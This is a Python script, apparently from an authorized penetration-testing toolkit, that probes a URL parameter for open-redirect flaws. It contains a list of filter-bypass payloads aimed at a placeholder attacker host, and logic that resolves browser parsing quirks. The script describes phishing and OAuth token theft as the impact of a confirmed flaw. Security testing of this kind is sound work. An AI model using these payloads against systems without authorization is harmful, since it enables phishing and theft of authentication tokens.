#!/usr/bin/env python3
"""redirect_probe.py — original, owned open-redirect probe for pen_test.

Injects a battery of open-redirect payloads into a candidate parameter and
inspects the response's Location header (redirects are NOT followed) to decide
whether the target host can be steered off-origin. Covers the classic filter
bypasses (`//evil`, `https:evil`, `\\/\\/evil`, `@`-userinfo, whitelisted-host
prefix) that defeat naive "startswith('/')" checks.

Runs through the shared _httpcore engine: any --location (query/form/header/
cookie/path), authenticated session, proxy passthrough.

AUTHORIZATION: authorized targets only — see agents/pen_test.md.

    python3 redirect_probe.py -u "https://app/login?next=/home" --param next
    python3 redirect_probe.py -u "https://app/go" --param url --location query
"""

from __future__ import annotations

import argparse
from urllib.parse import urlparse

import _httpcore as core

EVIL = "evil.example"

# {evil} is substituted with the attacker host; each is a distinct bypass class.
PAYLOADS = [
    ("plain-absolute",   "https://{evil}"),
    ("scheme-relative",  "//{evil}"),
    ("backslash",        "/\\{evil}"),
    ("double-backslash", "\\/\\/{evil}"),
    ("no-slash-scheme",  "https:{evil}"),
    ("userinfo-at",      "https://{host}@{evil}"),
    ("whitelist-prefix", "https://{host}.{evil}"),
    ("whitelist-sub",    "https://{evil}/{host}"),
    ("triple-slash",     "///{evil}"),
    ("cr-lf-guard",      "/%0d/{evil}"),
    ("dot-trick",        "https://{evil}%2f{host}"),
]


def _spec(args) -> core.RequestSpec:
    base_form = core.parse_kv(args.data.split("&"), "=") if args.data else {}
    import json as _json
    base_json = _json.loads(args.json) if args.json else None
    return core.RequestSpec(
        method=args.method, url=args.url, param=args.param, location=args.location,
        base_form=base_form, base_json=base_json,
    )


def _h(headers: dict, name: str) -> str | None:
    name = name.lower()
    for k, v in headers.items():
        if k.lower() == name:
            return v
    return None


def dest_host(location: str, base_url: str) -> str | None:
    """Resolve where a Location value actually points, mirroring browser quirks."""
    if not location:
        return None
    loc = location.strip()
    # Normalize backslashes the way browsers do before parsing.
    normalized = loc.replace("\\", "/")
    try:
        parsed = urlparse(normalized)
    except ValueError:
        return None
    if parsed.hostname:
        return parsed.hostname
    # scheme-relative //host or ///host
    if normalized.startswith("//"):
        rest = normalized.lstrip("/")
        return rest.split("/")[0].split("@")[-1].split("?")[0] or None
    # scheme without slashes: https:host
    if ":" in loc and not loc.startswith("/"):
        after = loc.split(":", 1)[1]
        if after and not after.startswith("/"):
            return after.split("/")[0].split("@")[-1] or None
    return None


def run(args) -> None:
    client = core.client_from_args(args)
    core.require_scheme(args.url)
    spec = _spec(args)
    target_host = urlparse(args.url).hostname or "target"
    print(f"Open-redirect probe: {args.method} {args.url}  param={args.param} in {args.location}")
    print(f"Target host: {target_host}   Attacker host: {EVIL}")
    print("-" * 72)

    found = []
    for label, tpl in PAYLOADS:
        payload = tpl.format(evil=EVIL, host=target_host)
        r = client.request(**spec.build(payload))
        if not r.ok:
            print(f"  {label:17s} -> error: {r.error}")
            continue
        loc = _h(r.headers, "location")
        where = dest_host(loc, args.url) if loc else None
        is_redirect = 300 <= r.status < 400
        off_host = bool(where) and EVIL in where and target_host not in where.replace(EVIL, "")
        flag = "OPEN REDIRECT" if (is_redirect and off_host) else ("meta/js?" if (where and EVIL in where) else "no")
        print(f"  {label:17s} status={r.status:>3}  Location={loc!r}  -> host={where!r}  [{flag}]")
        if is_redirect and off_host:
            found.append((label, payload, loc))

    print("\n" + "=" * 72)
    if found:
        label, payload, loc = found[0]
        print(f"[!] OPEN REDIRECT confirmed via `{label}` — {args.param}={payload}")
        print(f"    Server issued a 3xx to an attacker-controlled host (Location: {loc}).")
        print("    Impact: phishing, and — if this param is an OAuth redirect_uri — auth-code/token theft")
        print("    (see knowledge/oauth_oidc_sso.md). Also check body-based (meta refresh / JS) redirects manually.")
    else:
        print("[-] No off-host 3xx redirect from this param. If the app redirects via HTML/JS")
        print("    (meta refresh, location.href) rather than a Location header, re-check the body manually.")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--param", required=True, help="redirect parameter (next/url/return/redirect_uri...)")
    p.add_argument("--location", default="query", choices=core.LOCATIONS)
    p.add_argument("-X", "--method", default="GET")
    p.add_argument("--data", help="baseline form body k=v&k=v (for --location form)")
    p.add_argument("--json", help="baseline JSON body (for --location json)")
    core.add_common_args(p)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
